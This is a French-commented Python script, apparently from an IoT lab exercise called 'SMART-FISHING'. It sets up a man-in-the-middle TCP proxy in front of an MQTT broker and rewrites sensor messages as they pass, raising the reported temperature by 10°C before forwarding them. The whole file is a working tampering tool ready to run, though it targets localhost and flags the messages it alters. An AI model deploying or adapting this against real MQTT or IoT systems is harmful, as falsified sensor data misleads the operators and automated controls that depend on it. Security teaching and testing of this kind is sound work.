#!/usr/bin/env python3
"""
Script MITM — SMART-FISHING
Intercepte et modifie les messages MQTT en temps réel
"""

import socket
import threading
import json
import re

# Configuration
BROKER = "localhost"
BROKER_PORT = 1883
PROXY_PORT = 1884  # Le proxy écoute sur ce port

def handle_client(client_sock):
    """Gère la connexion d'un client (capteur) vers le broker"""
    
    # Connexion au broker
    broker_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    broker_sock.connect((BROKER, BROKER_PORT))
    
    print(f"[+] MITM actif : {client_sock.getpeername()} → Broker")
    
    while True:
        try:
            data = client_sock.recv(4096)
            if not data:
                break
            
            # Intercepter et modifier les messages PUBLISH
            if b"temperature" in data or b"valeur" in data:
                try:
                    # Décoder les données
                    payload_str = data.decode('utf-8', errors='ignore')
                    
                    # Chercher le JSON dans le payload
                    json_match = re.search(r'\{.*\}', payload_str)
                    if json_match:
                        json_str = json_match.group()
                        json_data = json.loads(json_str)
                        
                        # MODIFICATION : Ajouter 10°C à la température
                        if 'valeur' in json_data:
                            temp_originale = json_data['valeur']
                            json_data['valeur'] = round(temp_originale + 10.0, 2)
                            json_data['mitm'] = True  # Indicateur de compromission
                            
                            print(f"[MITM] Température modifiée : {temp_originale}°C → {json_data['valeur']}°C")
                            
                            # Remplacer l'ancien JSON par le nouveau
                            new_json_str = json.dumps(json_data)
                            payload_str = payload_str.replace(json_str, new_json_str)
                            data = payload_str.encode('utf-8')
                except Exception as e:
                    print(f"[MITM] Erreur : {e}")
            
            # Transmettre les données modifiées au broker
            broker_sock.send(data)
            
        except Exception as e:
            break
    
    # Fermer les connexions
    client_sock.close()
    broker_sock.close()
    print("[+] MITM terminé")

def main():
    """Lance le proxy MITM"""
    
    # Créer le socket serveur
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', PROXY_PORT))
    server.listen(5)
    
    print(f"[+] Proxy MITM en écoute sur le port {PROXY_PORT}")
    print("[+] Configurez le capteur pour utiliser ce proxy !")
    print("[+] La température sera augmentée de 10°C")
    print("[+] Appuyez sur Ctrl+C pour arrêter\n")
    
    try:
        while True:
            client_sock, addr = server.accept()
            print(f"[+] Nouvelle connexion reçue de {addr}")
            thread = threading.Thread(target=handle_client, args=(client_sock,))
            thread.daemon = True
            thread.start()
    except KeyboardInterrupt:
        print("\n[+] Arrêt du proxy MITM")
        server.close()

if __name__ == "__main__":
    main()
